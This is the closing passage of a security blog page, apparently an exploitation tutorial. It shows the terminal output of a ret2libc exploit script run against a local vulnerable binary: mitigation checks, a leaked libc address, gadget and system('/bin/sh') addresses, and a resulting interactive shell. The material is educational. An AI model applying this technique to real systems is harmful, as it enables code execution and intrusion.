+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./vuln&#39;</span>: pid 15796
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Loaded cached gadgets <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> puts@plt: 0x40042c
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> __libc_start_main: 0x600ff0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pop rdi gadget: 0x4005d3
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Leaked libc address,  __libc_start_main: 0x7f07dd0d4ab0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Address of libc 0x7f07dd0b3000 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> bin/sh 0x7f07dd266e9a 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system 0x7f07dd102440 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+
+
+$ ls
+exploit.py    Makefile  vuln.c  vuln
+libc-2.27.so  peda-session-vuln.txt         
+</code></pre></div>
+</div>
+
+
+        
+<div class="section bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/security">back</a>
+        
+            &#183;
+        
+    
+    <a href="https://tasteofsecurity.com/">
+        #root
+    </a>
+    &#183; 
+    
+        
+            <a href="/security/">
+                A taste of security
+            </a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/how-to/">
+                Break it, fix it.
+            </a>
+        
+            &#183; 
+            <a href="/about">
+                I&#39;m Hugo
+            </a>
+        
+    
+
+</p>
+
+</div>
+
+
+        <div class="section footer">© 2023 Hugo</div>
+    </div>
+</body>
+
+</html>
